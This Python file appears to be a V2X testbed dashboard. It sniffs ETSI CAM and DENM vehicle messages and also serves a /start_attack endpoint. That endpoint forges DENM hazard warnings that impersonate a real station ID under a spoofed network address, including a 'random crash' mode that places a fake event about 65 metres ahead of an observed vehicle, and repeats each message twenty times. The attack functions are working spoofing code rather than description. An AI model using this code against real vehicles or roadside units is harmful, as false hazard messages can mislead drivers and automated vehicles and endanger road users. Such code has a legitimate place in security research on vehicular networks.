from http.client import OK, NOT_FOUND, CREATED
import uvicorn
from flask import Flask, render_template, make_response, jsonify, request
from a2wsgi import WSGIMiddleware
from flask_cors import CORS

import os
import flatdict
import time
import random
import yaml
from enum import Enum
from typeguard import typechecked
from queue import Queue, Empty, Full
from threading import Thread

from pyv2x.etsi import ETSI, V2xTMsg
from pyv2x.v2x_msg import V2xMsg
from pyv2x.v2x_utils import V2xAsnP
from pyv2x.v2x_network import V2xNetwork
import pyshark

from math import asin, atan2, cos, degrees, radians, sin


@typechecked
class Config:

    def __init__(self, cpath: str):
        super().__init__()
        if not os.path.exists(cpath):
            raise Exception(f"file: {cpath} not exists")
        with open(cpath, "r") as f:
            data = yaml.safe_load(f)
        
        self.__dict__.update(**flatdict.FlatDict(data, delimiter="."))
    
    def __iter__(self):
        return iter(self.__dict__.items())
    
    def __repr__(self):
        return str(dict(self))
    
    def get(self, key: str):
        return dict(self).get(key, None) 


class AttackID(Enum):
    NOT_ATTACK      = -1
    ATTACK_SEM      = 0
    ATTACK_NO_SEM   = 1
    RANDOM_CRASH    = 2

def get_point_at_distance(lat1, lon1, d, bearing, R=6371):
    lat1, lon1 = radians(lat1), radians(lon1)
    a = radians(bearing)
    lat2 = asin(sin(lat1) * cos(d/R) + cos(lat1) * sin(d/R) * cos(a))
    lon2 = lon1 + atan2(
        sin(a) * sin(d/R) * cos(lat1),
        cos(d/R) - sin(lat1) * sin(lat2)
    )
    return (degrees(lat2), degrees(lon2),)

def polling():
    while 1:
        trace = pyshark.LiveCapture(interface=conf.get("general.iface"), use_json=True, include_raw=True, display_filter="its")
        for pkt in trace.sniff_continuously():
            mID = ETSI.get_message_id(pkt)
            # print(f"{mID = }")
            match mID:
                case V2xTMsg.DENM:
                    msg = DENM(pkt=pkt)
                    if msg.stationID != 12131: continue
                    if q_denm.full():
                        q_denm.get_nowait()
                    q_denm.put(msg)
                case V2xTMsg.CAM:
                    msg = CAM(pkt=pkt)
                    if msg.stationID != 4316: continue
                    if q_cam.full():
                        q_cam.get_nowait()
                    q_cam.put(msg)
        time.sleep(0.05)

def gen_attack_denm(sub_code: int, lat = 446529860, lon = 109299810) -> "DENM":
    return DENM( 
        protocolVersion=2, 
        messageID=1, 
        stationID=12130, 
        originatingStationID=12131, 
        sequenceNumber=1, 
        detectionTime=100000000, 
        referenceTime=0, 
        latitude=lat, 
        longitude=lon, 
        semiMajorConfidence=282, 
        semiMinorConfidence=278, 
        semiMajorOrientation=616,     
        altitudeValue=9650, 
        altitudeConfidence="alt-020-00", 
        validityDuration=1, 
        stationType=15, 
        situation_informationQuality=4, 
        situation_eventType_causeCode=1, 
        situation_eventType_subCauseCode=sub_code, 
    )

def perform_attack(net, msg):
    for i in range(20):
        net.send_msg(ETSI.format_msg(msg, gn_addr_address="CA:6F:47:51:47:8B"))
        time.sleep(random.random())


app = Flask(__name__)
CORS(app)

conf = Config("./app.yaml")

CAM = V2xAsnP().new("CAM", conf.get("asn.cpath")).create_class()
DENM = V2xAsnP().new("DENM", conf.get("asn.dpath")).create_class()

# TODO: in V2xnetwork set a parameters on the queue dimension and the rules if not inf (drop on full or drop oldest packet)
net = V2xNetwork( conf.get("general.iface"), [ DENM, CAM ], enable_listener=False )

q_cam = Queue(maxsize=1)
q_denm = Queue(maxsize=1)

information = Thread(target=polling, daemon=True)
information.start()

# time.sleep(5)
# exit()

@app.route("/obu")
def get_obu_data():
   
    msg = q_cam.get()
    if msg is None:
        return make_response( jsonify({"msg": "not available data"}, NOT_FOUND, { "Content-type": "application/json" }))
    
    data = {
        "msg": "ok",
        "vehicle_id": "OBU-001",
        "lat": msg.latitude * 1e-7,
        "lon": msg.longitude * 1e-7,
        "vehicle_type": "auto",
        "speed": msg.speedValue,
        "heading": msg.headingValue
    }
    return make_response( jsonify(data), OK, { "Content-type": "application/json" })

@app.route("/rsu")
def get_rsu_data():

    fpath, status = conf.get("denm.fpSubCauseCode"), -1
    data = { "sub_cause_code": status }
    
    if q_denm.empty():
        return make_response( jsonify(data), OK, {"Content-type": "application/json"})

    msg = q_denm.get()
    for i in range(1, len(fpath.split(".")) + 1):
        p = ".".join( fpath.split(".")[-i:] )
        if p in dict(msg).keys():
            status = dict(msg).get(p)
            break
    
    data = { "sub_cause_code": status }
    return make_response( jsonify(data), OK, {"Content-type": "application/json"})

@app.route("/start_attack", methods=[ "POST" ])
def start_attack():
    data = request.get_json()
    attack_id = int(data.get("attack_id", -1))
    
    informaion = None
    print(f"{attack_id = }")
    match attack_id:
        case AttackID.ATTACK_SEM.value:
            information = Thread(target=perform_attack, args=(net, gen_attack_denm(1)), daemon=True)
        case AttackID.ATTACK_NO_SEM.value:
            information = Thread(target=perform_attack, args=(net, gen_attack_denm(3)), daemon=True)
        case AttackID.RANDOM_CRASH.value:
            m_cam = q_cam.get()
            heading, lat, lon, d = m_cam.headingValue, m_cam.latitude * 1e-7, m_cam.longitude * 1e-7, 65 * 1e-3 # meters
            lat, lon = get_point_at_distance(lat, lon, d, heading)
            information = Thread(target=perform_attack, args=(net, gen_attack_denm(3, int(lat * 1e7), int(lon * 1e7))), daemon=True)

    information.start()
    information.join()
    return make_response( jsonify({"msg": "ok"}), CREATED, {"Content-type": "application/json"})

@app.route('/')
def dashboard():
    return render_template('dashboard.html')

asgi_app = WSGIMiddleware(app)

if __name__ == "__main__":
    uvicorn.run(asgi_app, host="0.0.0.0", port=8000)

